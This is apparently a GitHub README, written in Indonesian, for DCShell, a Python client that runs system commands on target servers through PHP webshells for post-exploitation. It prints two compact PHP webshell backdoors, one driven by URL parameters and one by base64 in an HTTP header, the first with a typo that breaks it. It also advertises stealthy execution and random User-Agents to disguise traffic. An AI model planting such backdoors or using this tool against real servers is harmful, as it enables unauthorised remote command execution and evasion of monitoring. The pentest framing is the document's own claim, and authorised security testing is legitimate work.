![image](https://github.com/user-attachments/assets/b5eac3e2-eb02-4f29-a604-47a8264f23b6)

# 🛠️ DCShell v.1
DCShell adalah sebuah tools berbasis Python yang dirancang untuk mempermudah interaksi dengan webshell dalam skenario pengujian penetrasi (pentest). Tools ini menyediakan antarmuka berbasis terminal yang ramah pengguna serta mendukung dua mode eksekusi shell, yaitu:
- Rootkit Mode: Mengakses webshell yang dilindungi dengan password, di mana perintah dieksekusi melalui parameter URL.
  ```
  <?=$_GET[p]==_&&$_GET[f]($GET_[c]);
  ```
  
- Raptor Mode: Mengakses webshell yang menerima payload melalui header HTTP, di mana perintah dienkode dalam base64 dan disisipkan secara acak dalam header khusus.
  ```
  <?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
  ```

# 🎯 Tujuan Penggunaan
DCShell ditujukan untuk mempermudah eksekusi perintah sistem di server target melalui webshell secara stealthy, cepat, dan fleksibel. Cocok digunakan saat fase post-exploitation dalam pengujian keamanan aplikasi web, terutama ketika backdoor atau akses awal telah diperoleh.

# ⚙️ Fitur Unggulan
- 🔐 Dukungan password untuk webshell (mode Rootkit)
- 🧬 Payload base64 via header (mode Raptor)
- 🎛️ Pilihan fungsi PHP: system, passthru, shell_exec, dan exec
- 🎲 User-Agent acak otomatis untuk menyamarkan traffic
- 💻 Antarmuka interaktif dengan visualisasi tabel menggunakan rich
- 🚀 Loop perintah real-time seperti shell di terminal

# 💡 Usage
1. Pengguna memilih mode shell (Rootkit/Raptor).
   ![image](https://github.com/user-attachments/assets/20915e32-5c00-4bab-83ef-8bf9f0838a35)
3. Memasukkan URL shell dan informasi tambahan (seperti password).
   ![image](https://github.com/user-attachments/assets/04aa926f-9cfd-49d9-951f-3941691e551c)
5. Memilih metode eksekusi fungsi PHP.
6. Memasukkan perintah-perintah sistem untuk dieksekusi di server target.
7. Tools akan mengirim permintaan HTTP ke webshell dan menampilkan output di terminal.
8. Final
   ![image](https://github.com/user-attachments/assets/78668640-8523-4d1f-8291-28cedee69adc)

